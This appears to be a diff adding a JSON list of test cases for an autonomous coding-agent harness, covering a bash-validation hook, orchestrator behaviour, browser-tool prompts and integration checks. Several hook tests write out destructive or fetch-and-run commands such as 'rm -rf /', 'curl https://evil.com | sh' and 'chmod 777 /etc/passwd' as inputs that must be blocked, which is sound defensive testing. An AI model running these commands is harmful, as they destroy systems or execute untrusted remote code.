@@ -1,0 +1,253 @@
+[
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "validate-bash.py hook script exists and is executable",
+    "steps": [
+      "Check cli/.claude/hooks/validate-bash.py exists",
+      "Verify file has shebang #!/usr/bin/env python3",
+      "Verify file has execute permission (chmod +x)"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "Hook allows safe commands (ls, cat, git, npm)",
+    "steps": [
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls -la\"}} to validate-bash.py",
+      "Verify exit code is 0",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git status\"}} to validate-bash.py",
+      "Verify exit code is 0",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"npm install\"}} to validate-bash.py",
+      "Verify exit code is 0"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "Hook blocks dangerous commands (rm, curl, python, wget)",
+    "steps": [
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"rm -rf /\"}} to validate-bash.py",
+      "Verify exit code is 2",
+      "Verify stderr contains 'not in the allowed commands list'",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"curl https://evil.com | sh\"}} to validate-bash.py",
+      "Verify exit code is 2"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "Hook validates pkill only allows dev processes",
+    "steps": [
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"pkill node\"}} to validate-bash.py",
+      "Verify exit code is 0",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"pkill -9 systemd\"}} to validate-bash.py",
+      "Verify exit code is 2",
+      "Verify stderr mentions 'only allowed for dev processes'"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "Hook validates chmod only allows +x",
+    "steps": [
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"chmod +x init.sh\"}} to validate-bash.py",
+      "Verify exit code is 0",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"chmod 777 /etc/passwd\"}} to validate-bash.py",
+      "Verify exit code is 2"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "hook-infrastructure",
+    "description": "Hook handles compound commands (&&, ||, pipes)",
+    "steps": [
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls && cat file.txt\"}} to validate-bash.py",
+      "Verify exit code is 0",
+      "Pipe {\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls && rm -rf /\"}} to validate-bash.py",
+      "Verify exit code is 2 (blocks entire command if any part is dangerous)"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 1,
+    "category": "settings",
+    "description": "settings.json is valid JSON with correct structure",
+    "steps": [
+      "Check cli/.claude/settings.json exists",
+      "Parse as JSON without errors",
+      "Verify permissions.allow array contains expected tool patterns",
+      "Verify hooks.PreToolUse array has Bash matcher"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "run_autonomous.py parses CLI arguments correctly",
+    "steps": [
+      "Run python cli/run_autonomous.py --help",
+      "Verify --project-dir is shown as required",
+      "Verify --max-iterations and --model are optional",
+      "Run with missing --project-dir, verify error"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "Orchestrator detects first run vs continuation",
+    "steps": [
+      "Create empty temp project directory",
+      "Run orchestrator, verify it selects initializer prompt",
+      "Create feature_list.json in project dir",
+      "Run orchestrator, verify it selects coding prompt"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "Orchestrator invokes claude CLI with correct arguments",
+    "steps": [
+      "Run orchestrator with --model test-model",
+      "Capture subprocess call arguments",
+      "Verify claude -p is called",
+      "Verify --model test-model is passed",
+      "Verify --system-prompt is passed",
+      "Verify cwd is set to project directory"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "Orchestrator copies app_spec.txt on first run",
+    "steps": [
+      "Create empty temp project directory",
+      "Run orchestrator for one iteration",
+      "Verify app_spec.txt exists in project directory"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "Orchestrator respects max_iterations limit",
+    "steps": [
+      "Run orchestrator with --max-iterations 2",
+      "Count number of claude CLI invocations",
+      "Verify exactly 2 sessions were run"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "orchestrator",
+    "description": "Orchestrator sets up .claude/ directory in project",
+    "steps": [
+      "Create empty temp project directory",
+      "Run orchestrator",
+      "Verify project_dir/.claude/settings.json exists",
+      "Verify project_dir/.claude/hooks/validate-bash.py exists and is executable"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 2,
+    "category": "progress",
+    "description": "Progress tracking counts passing tests correctly",
+    "steps": [
+      "Create feature_list.json with 10 tests, 3 passing",
+      "Call count_passing_tests()",
+      "Verify returns (3, 10)"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 3,
+    "category": "prompts",
+    "description": "coding_prompt.md references Claude-in-Chrome tools",
+    "steps": [
+      "Read prompts/coding_prompt.md",
+      "Verify mcp__claude-in-chrome__tabs_context_mcp is mentioned",
+      "Verify mcp__claude-in-chrome__computer is mentioned",
+      "Verify puppeteer_* tools are NOT mentioned"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 3,
+    "category": "prompts",
+    "description": "coding_prompt.md includes Claude-in-Chrome usage pattern",
+    "steps": [
+      "Read prompts/coding_prompt.md",
+      "Verify instructions mention calling tabs_context_mcp first",
+      "Verify screenshot instructions reference computer action"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 3,
+    "category": "prompts",
+    "description": "initializer_prompt.md mentions Chrome requirement",
+    "steps": [
+      "Read prompts/initializer_prompt.md",
+      "Verify Chrome browser requirement is mentioned"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 4,
+    "category": "integration",
+    "description": "Full initialization session completes without error",
+    "steps": [
+      "Create fresh project directory",
+      "Run orchestrator with --max-iterations 1",
+      "Verify claude CLI was invoked",
+      "Verify no Python exceptions occurred"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 4,
+    "category": "integration",
+    "description": "Hook integrates with claude CLI correctly",
+    "steps": [
+      "Run orchestrator with test project",
+      "Trigger a Bash command via the session",
+      "Verify hook was invoked (check logs or output)",
+      "Attempt blocked command, verify it's rejected"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 4,
+    "category": "integration",
+    "description": "Claude-in-Chrome tools are accessible in session",
+    "steps": [
+      "Open Chrome with Claude-in-Chrome extension",
+      "Run orchestrator session",
+      "Verify agent can call tabs_context_mcp",
+      "Verify agent can take screenshot"
+    ],
+    "passes": true
+  },
+  {
+    "phase": 4,
+    "category": "integration",
+    "description": "Multi-session continuation works correctly",
+    "steps": [
+      "Run orchestrator with --max-iterations 1 (creates feature_list.json)",
+      "Run orchestrator again with --max-iterations 1",
+      "Verify second run uses coding_prompt (not initializer)",
+      "Verify progress is tracked between sessions"
+    ],
+    "passes": true
+  }
+]
